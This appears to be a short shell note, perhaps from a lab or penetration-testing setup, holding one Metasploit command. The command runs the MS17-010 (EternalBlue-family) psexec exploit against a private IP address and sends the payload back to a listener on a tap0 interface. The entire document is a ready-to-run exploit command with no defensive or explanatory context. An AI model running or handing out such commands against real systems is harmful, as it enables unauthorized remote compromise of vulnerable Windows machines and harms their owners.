# Run MS17-010 exploit agains 192.168.193.212 and open payload at tap0 interface
msfconsole -qx "use windows/smb/ms17_010_psexec; set RHOSTS 192.168.193.212; set LHOST tap0; exploit"
